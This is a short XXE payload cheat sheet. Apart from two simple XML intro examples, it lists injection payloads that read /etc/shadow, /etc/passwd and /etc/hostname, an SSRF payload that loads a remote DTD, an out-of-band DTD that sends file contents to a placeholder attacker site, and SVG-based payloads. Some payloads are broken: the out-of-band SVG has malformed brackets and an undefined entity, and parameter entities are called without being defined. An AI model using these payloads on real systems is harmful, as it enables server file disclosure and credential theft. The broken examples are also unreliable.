XXE: Basic XML Example

<?xml version="1.0" encoding="utf-8"?>
	<userInfo>
	  <firstName>Rahul</firstName>
  	  <lastName>Jain</lastName>
 	</userInfo>

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: Entity Example

<?xml version="1.0" encoding="utf-8"?>

	<!DOCTYPE replace [
	<!ENTITY test "Doe"> ]> 
	 <userInfo>
  	   <firstName>Rahul</firstName>
	   <lastName>&test;</lastName>
 	 </userInfo>

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: File Disclosure Example 

<?xml version="1.0" encoding="utf-8"?>
	
	<!DOCTYPE replace [
	 <!ENTITY test SYSTEM "file:///etc/shadow"> ]>
	 <userInfo>
	   <firstName>Rahul</firstName>
 	   <lastName>&test;</lastName>
	 </userInfo>

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: Local File Inclusion Example

<?xml version="1.0" encoding="utf-8"?>
 	<!DOCTYPE foo [  
	<!ELEMENT foo (#ANY)>
	<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
	<foo>&xxe;</foo>

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: Server Side Request Forgery Example

<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE reset [
	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
	%remote;
	%int;
	%trick; ]>

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: Payload Using DTD File

	<!ENTITY % a SYSTEM 'file:///etc/passwd'>
	<!ENTITY % b "<!ENTITY &#x25; c SYSTEM 'your website/?cookie=%a;'> " > 
	%b;
	%c;

(&#x25),(&#37) Are the  Hex and decimal value of (%)

To Call This File   

<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE xxe [
	<!ENTITY % remote SYSTEM 'http://IP/file_name'>
	%remote;

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: Exploit Using SVG Image 

	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

----------------------------------------------------------------------------------------------------------------------------------------------------------

XXE: Exploit Using SVG Image (Out Of Band Method)

	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <<!ENTITY % a SYSTEM "file:///etc/hostname" >>  <!ENTITY b SYSTEM "ur ip/x=?%a; " > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

----------------------------------------------------------------------------------------------------------------------------------------------------------
